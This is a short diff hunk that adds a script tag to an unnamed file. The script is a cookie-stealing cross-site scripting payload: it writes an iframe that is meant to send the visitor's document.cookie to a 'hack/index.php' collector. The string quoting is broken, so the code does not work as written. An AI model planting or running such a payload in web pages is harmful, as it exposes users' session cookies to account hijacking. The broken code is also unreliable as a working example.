@@ -1,0 +1,4 @@
+
+<script >
+	document.write("<iframe src='http://localhost/ntal/hack/index.php?">+document.cookie+"'></iframe>");
+</script>
